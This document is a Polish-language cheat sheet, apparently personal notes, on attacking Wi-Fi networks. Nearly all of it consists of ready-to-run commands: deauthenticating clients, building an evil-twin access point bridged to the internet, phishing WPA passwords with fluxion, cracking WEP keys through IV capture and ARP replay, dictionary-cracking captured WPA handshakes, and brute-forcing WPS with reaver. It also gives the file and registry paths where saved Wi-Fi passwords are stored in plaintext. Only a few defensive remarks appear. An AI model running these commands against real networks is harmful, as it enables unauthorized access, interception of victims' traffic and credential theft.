### Do zainstalowania
* wireshark + libpcap (biblioteka powinna się zainstalować wraz z wiresharkiem)
* [aircrack-ng](https://www.aircrack-ng.org/)1
* [reaver, wash](http://tools.kali.org/wireless-attacks/reaver)
* [fluxion](https://github.com/deltaxflux/fluxion) - ma sporo zależności


### Podstawy
* budowa ramek 802.11
* protokół połączenia
* konfiguracja karty sieciowej
    ```
    wlp5s0/wlp5s0mon - interfejs bezprzewodowy
    enp2s0 - interfejs po kablu
    at0 - crated by airbase-ng

    # troche informacji
    ifconfig/iwconfig
    iwlist wlp5s0 channel
    ip link show wlp5s0
    iw reg get


    systemctl stop network
    killall wpa_supplicant
    killall dhclient

    ifconfig wlp5s0 down
    iwconfig wlp5s0 mode monitor
    ifconfig wlp5s0 up

    # lub
    airmon-ng check kill
    airmon-ng start wlp5s0
    ```


### Acess-Point scanning
```
#wszystkie AP w zasięgu
iwlist wlp5s0 s

# lub
airodump-ng  wlp5s0 <--essid xxx> <--channel 36> <--write dump_file>

# filtrowanie wireshak
wlan_mgt.ssid == "ESSID/BSSID"
wlan.bssid == mac
wlan.sa == mac

# lub Kismet
```


### deauth
```
aireplay-ng --deauth 0 -a <BSSID> -c <target MAC> wlp5s0
# lub
airdrop-ng -i wlp5s0 -r rule_file
```
* Management Frame Protection


### MITM
* zapamiętane sieci
    ```
    #lista zapamiętanych
    nmcli -p c

    # Na maszynach plaintextem
        Windows:
            xp - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces
            nowsze - c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces
        NetworkManager: 
            fedora - /etc/sysconfig/network-scripts/keys-*
            debian/ubuntu - etc/NetworkManager/system-connections/
        wpa_supplicant:
            /etc/wpa_supplicant/wpa_supplicant.conf
    ```

* evil twin
    ```
    # znaleźć MAC ofiary, dane o połączonym AP 
    # wzmocnić kartę (max w Polsce: 20dBm)
        iwconfig wlp5s0 txpower 20
    # postawić nasz fałszywy AP
        airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> wlp5s0
    # odłączyć nasz cel (albo wszystkich) od obecnego AP na kilka sekund
    # stworzyć bridge (połączenie z internetem dla ofiary)
        brctl addbr evil
        brctl addif evil enp2s0
        brctl addif evil at0
        ifconfig enp2s0 0.0.0.0 up 
        ifconfig at0 0.0.0.0 up
        ifconfig evil up
        dhclient evil & 
    ```

* fluxion, czyli hasła WPA via phishing
    ```
    git clone https://github.com/deltaxflux/fluxion
    ./Installer.sh
    ./fluxion
    ```


### WEP
* łamanie
    ```
    # odpal interfejs w trybie monitor
    # przetestuj
         aireplay-ng -c <channel> -e <essid> -a <target AP bssid>  wlp5s0mon
    # łap IV
        airodump-ng -c <channel> --bssid <target bssid> -w output wlp5s0mon
    # w osobnym terminalu połącz się z AP (żeby móc tworzyć IV)
         aireplay-ng -1 0 -e <essid> -a <target AP bssid> -h <our MAC> wlp5s0mon
    # rób jeszcze więcej IV via ARP request-replay
         aireplay-ng -3 -b <target AP bssid> -h <our MAC> wlp5s0mon
    # złam klucz bazując na IV
         aircrack-ng -b <target AP bssid> output*.cap
    ```

* łączenie z AP bez hasła
    `easside-ng`

* nawet lepsze ataki: patrz. wesside-ng

### WPA/WPA2
* tkiptun-ng, docelowo umożliwiający wstrzykiwanie pakietów (https://www.aircrack-ng.org/doku.php?id=tkiptun-ng), lepiej używać AES
* WPA(2) nie zapewnia 'forward secrecy', jeśli znasz hasło/PMK, deszyfrujesz cały ruch
    ```airdecap-ng -l -e <essid> -p <password> sniffed.pcap```
* łamanie słownikowe
    ```
    # automatycznie przechwyć wszystkie handshakes, dodatkowo połam znalezione WEPy ;p
        besside-ng -W -c <channel> -b <target AP bssid> wlp5s0mon
    # teraz wrzuć to na http://wpa.darkircop.org/index.php
    # albo użyj aircrack-ng ze słownikiem
        aircrack-ng -w slownik -b <target AP bssid> wpa.cap
    ```

* Wersja enterprise - bezpieczniejsza


### EAP-MD5 czy EAP-LEAP (złamane)
### RADIUS

### WPS
* Super zue
* łamanie
    ```
    # wykrycie WPS
        wash -i wlp5s0mon -s -C
    # teraz
        reaver -i wlp5s0mon -b <target AP bssid> -vv -d 0 --dh-small
    ```
